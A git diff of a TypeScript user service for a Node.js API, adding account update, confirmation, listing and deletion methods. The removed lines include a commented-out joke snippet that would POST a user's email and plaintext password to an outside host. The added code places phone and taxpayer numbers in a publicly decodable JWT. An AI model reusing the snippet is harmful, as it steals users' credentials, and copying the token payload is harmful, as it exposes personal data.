@@ -9,7 +9,7 @@ import config from '../../config';
 
 import { IUserDTO } from '../dto/IUserDTO';
 import { UserMap } from '../mappers/UserMap';
-import IUserService from '../services/IServices/IUserService';
+import IUserService, { UserToken } from '../services/IServices/IUserService';
 
 import IRoleRepo from './IRepos/IRoleRepo';
 import IUserRepo from './IRepos/IUserRepo';
@@ -30,31 +30,54 @@ export default class UserService implements IUserService {
     @Inject('logger') private logger,
   ) {}
 
-  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
+  public async getUserByEmail(email: string): Promise<Result<IUserDTO>> {
+    try {
+      const user = await this.userRepo.findByEmail(email);
+      const found = !!user;
+
+      if (!found) {
+        return Result.fail<IUserDTO>('User not found with email=' + email);
+      }
+
+      const userDTO = UserMap.toDTO(user) as IUserDTO;
+
+      return Result.ok<IUserDTO>(userDTO);
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  public async getUserById(id: string): Promise<Result<IUserDTO>> {
+    try {
+      const user = await this.userRepo.findById(id);
+      const found = !!user;
+
+      if (!found) {
+        return Result.fail<IUserDTO>('User not found with id=' + id);
+      }
+
+      const userDTO = UserMap.toDTO(user) as IUserDTO;
+
+      return Result.ok<IUserDTO>(userDTO);
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  public async signUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO }>> {
     try {
       const userDocument = await this.userRepo.findByEmail(userDTO.email);
       const found = !!userDocument;
 
       if (found) {
-        return Result.fail<{ userDTO: IUserDTO; token: string }>('User already exists with email=' + userDTO.email);
+        return Result.fail<{ userDTO: IUserDTO }>({ message: 'User already exists with email=' + userDTO.email });
       }
 
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
+      if (config.allowedEmailDomains?.length > 0 && !config.allowedEmailDomains.includes(userDTO.email.split('@')[1])) {
+        return Result.fail<{ userDTO: IUserDTO }>({ message: 'Email must end with a permitted domain' });
+      }
 
       const salt = randomBytes(32);
       this.logger.silly('Hashing password');
@@ -65,9 +88,9 @@ export default class UserService implements IUserService {
       const email = await UserEmail.create(userDTO.email).getValue();
       let role: Role;
 
-      const roleOrError = await this.getRole(userDTO.role);
+      const roleOrError = await this.getRole(userDTO.role || config.defaultUserRole);
       if (roleOrError.isFailure) {
-        return Result.fail<{ userDTO: IUserDTO; token: string }>(roleOrError.error);
+        return Result.fail<{ userDTO: IUserDTO }>(roleOrError.error);
       } else {
         role = roleOrError.getValue();
       }
@@ -76,20 +99,23 @@ export default class UserService implements IUserService {
         firstName: userDTO.firstName,
         lastName: userDTO.lastName,
         email: email,
+        phonenumber: userDTO.phonenumber,
+        taxpayernumber: userDTO.taxpayernumber || '',
         role: role,
         password: password,
+        isConfirmed: userDTO.isConfirmed || false,
       });
 
       if (userOrError.isFailure) {
-        throw Result.fail<IUserDTO>(userOrError.errorValue());
+        throw Result.fail<{ userDTO: IUserDTO }>(userOrError.errorValue());
       }
 
       const userResult = userOrError.getValue();
 
-      this.logger.silly('Generating JWT');
-      const token = this.generateToken(userResult);
+      // this.logger.silly('Generating JWT');
+      // const token = this.generateToken(userResult);
 
-      this.logger.silly('Sending welcome email');
+      // this.logger.silly('Sending welcome email');
       //await this.mailer.SendWelcomeEmail(userResult);
 
       //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });
@@ -97,18 +123,18 @@ export default class UserService implements IUserService {
       await this.userRepo.save(userResult);
       const userDTOResult = UserMap.toDTO(userResult) as IUserDTO;
 
-      return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTOResult, token: token });
+      return Result.ok<{ userDTO: IUserDTO }>({ userDTO: userDTOResult });
     } catch (e) {
       this.logger.error(e);
       throw e;
     }
   }
 
-  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
+  public async signIn(email: string, password: string): Promise<Result<UserToken>> {
     const user = await this.userRepo.findByEmail(email);
 
     if (!user) {
-      throw new Error('User not registered');
+      return Result.fail<UserToken>('Invalid Email or Password');
     }
 
     /**
@@ -118,31 +144,134 @@ export default class UserService implements IUserService {
     const validPassword = await argon2.verify(user.password.value, password);
     if (validPassword) {
       this.logger.silly('Password is valid!');
+      if (user.isConfirmed === false) {
+        return Result.fail<UserToken>({ message: 'User not confirmed' });
+      }
+
       this.logger.silly('Generating JWT');
       const token = this.generateToken(user) as string;
 
       const userDTO = UserMap.toDTO(user) as IUserDTO;
 
-      return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTO, token: token });
+      return Result.ok<UserToken>({ userDTO: userDTO, token: token });
     } else {
-      throw new Error('Invalid Password');
+      return Result.fail<UserToken>('Invalid Email or Password');
+    }
+  }
+
+  public async updateUser(email: string, userDTO: Partial<IUserDTO>): Promise<Result<UserToken>> {
+    try {
+      const user = await this.userRepo.findByEmail(email);
+      const found = !!user;
+
+      if (!found) {
+        return Result.fail<UserToken>('User not found with email=' + userDTO.email);
+      }
+
+      if (userDTO.email && email !== userDTO.email) {
+        const userWithNewEmail = await this.userRepo.findByEmail(userDTO.email);
+
+        if (userWithNewEmail) {
+          return Result.fail('Email taken');
+        }
+
+        if (
+          config.allowedEmailDomains?.length > 0 &&
+          !config.allowedEmailDomains.includes(userDTO.email.split('@')[1])
+        ) {
+          return Result.fail({ message: 'Email must end with a permitted domain' });
+        }
+      }
+
+      if (userDTO.firstName) {
+        user.firstName = userDTO.firstName;
+      }
+      if (userDTO.lastName) {
+        user.lastName = userDTO.lastName;
+      }
+      if (userDTO.email) {
+        user.email = await UserEmail.create(userDTO.email).getValue();
+      }
+      if (userDTO.phonenumber) {
+        user.phonenumber = userDTO.phonenumber;
+      }
+      if (userDTO.taxpayernumber) {
+        user.taxpayernumber = userDTO.taxpayernumber;
+      }
+      if (userDTO.password) {
+        const salt = randomBytes(32);
+        const hashedPassword = await argon2.hash(userDTO.password, { salt });
+        user.password = await UserPassword.create({ value: hashedPassword, hashed: true }).getValue();
+      }
+
+      const updatedUser = await this.userRepo.save(user);
+      const updatedUserDTO = UserMap.toDTO(updatedUser) as IUserDTO;
+
+      const token = this.generateToken(updatedUser) as string;
+
+      return Result.ok<UserToken>({ userDTO: updatedUserDTO, token: token });
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  public async setUserConfirmation(email: string, isConfirmed: boolean): Promise<Result<void>> {
+    try {
+      const user = await this.userRepo.findByEmail(email);
+      const found = !!user;
+
+      if (!found) {
+        return Result.fail<void>('User not found with email=' + email);
+      }
+
+      user.isConfirmed = isConfirmed;
+
+      await this.userRepo.save(user);
+
+      return Result.ok<void>();
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  public async getAllUsers(): Promise<Result<IUserDTO[]>> {
+    try {
+      const users = await this.userRepo.getAll();
+
+      const userDTOs = users.map((user) => UserMap.toDTO(user) as IUserDTO);
+
+      return Result.ok<IUserDTO[]>(userDTOs);
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  public async deleteUser(email: string): Promise<Result<void>> {
+    try {
+      const user = await this.userRepo.findByEmail(email);
+      const found = !!user;
+
+      if (!found) {
+        return Result.fail<void>('User not found with email=' + email);
+      }
+
+      await this.userRepo.delete(user);
+
+      return Result.ok<void>();
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
     }
   }
 
   private generateToken(user) {
     const today = new Date();
     const exp = new Date(today);
-    exp.setDate(today.getDate() + 60);
+    exp.setDate(today.getDate() + 60); // Token will last 60 days
 
-    /**
-     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
-     * The cool thing is that you can add custom properties a.k.a metadata
-     * Here we are adding the userId, role and name
-     * Beware that the metadata is public and can be decoded without _the secret_
-     * but the client cannot craft a JWT to fake a userId
-     * because it doesn't have _the secret_ to sign it
-     * more information here: https://softwareontheroad.com/you-dont-need-passport
-     */
     this.logger.silly(`Sign JWT for userId: ${user._id}`);
 
     const id = user.id.toString();
@@ -158,8 +287,10 @@ export default class UserService implements IUserService {
         role: role,
         firstName: firstName,
         lastName: lastName,
+        phonenumber: user.phonenumber,
+        taxpayernumber: user.taxpayernumber,
         exp: exp.getTime() / 1000,
-      },
+      } as IUserDTO & { exp: number },
       config.jwtSecret,
     );
   }
